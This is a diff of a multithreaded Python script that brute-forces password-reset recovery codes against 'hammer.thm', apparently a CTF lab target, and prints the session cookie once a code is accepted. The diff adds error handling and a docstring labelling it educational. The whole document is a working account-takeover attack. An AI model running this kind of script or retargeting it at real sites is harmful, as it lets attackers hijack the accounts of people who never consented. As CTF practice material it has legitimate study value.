@@ -1,9 +1,20 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+
+"""
+Reset Password Code Brute-Forcer
+Author: Julián Rodríguez
+Description:
+  Script to brute-force recovery codes in multi-threaded mode.
+  For educational purposes only. Use in controlled environments like CTFs or labs.
+"""
+
 import requests
 import time
 import threading
 import sys
 
-URL = "http://hammer.thm:1337/reset_password.php"
+URL = "http://hammer.thm:1337/reset_password.php" 
 EMAIL = "tester@hammer.thm"
 CODES = ["1337", "1234", "0000", "4321", "9999"]  # Códigos a probar, 1 por hilo
 
@@ -19,19 +30,27 @@ HEADERS_TEMPLATE = {
     'Upgrade-Insecure-Requests': '1'
 }
 
-found = threading.Event()  # Bandera global para parar los hilos cuando uno acierte
+found = threading.Event()  # Bandera global para detener los hilos cuando uno acierte
 
 def iniciar_recuperacion(session, headers):
-    data = { "email": EMAIL }
-    r = session.post(URL, headers=headers, data=data)
-    return "Enter Recovery Code" in r.text
+    try:
+        data = { "email": EMAIL }
+        r = session.post(URL, headers=headers, data=data)
+        return "Enter Recovery Code" in r.text
+    except requests.RequestException as e:
+        print(f"[!] Error en iniciar_recuperacion: {e}")
+        return False
 
 def enviar_codigo(session, headers, code):
-    data = {
-        "recovery_code": code,
-        "s": "127"
-    }
-    return session.post(URL, headers=headers, data=data)
+    try:
+        data = {
+            "recovery_code": code,
+            "s": "127"
+        }
+        return session.post(URL, headers=headers, data=data)
+    except requests.RequestException as e:
+        print(f"[!] Error en enviar_codigo: {e}")
+        return None
 
 def worker(code):
     while not found.is_set():
@@ -46,11 +65,14 @@ def worker(code):
 
         r = enviar_codigo(session, headers, code)
 
+        if r is None:
+            continue
+
         if "Invalid or expired recovery code" not in r.text:
             print(f"\n[✅] Hilo {code} → ¡Código correcto encontrado! => {code}")
             print(f"[🍪] PHPSESSID: {session.cookies.get_dict().get('PHPSESSID', 'No encontrado')}")
-            found.set()  # Detiene otros hilos
-            sys.exit(0)
+            found.set()
+            return
         else:
             print(f"[✗] Hilo {code} → Código incorrecto.")
 
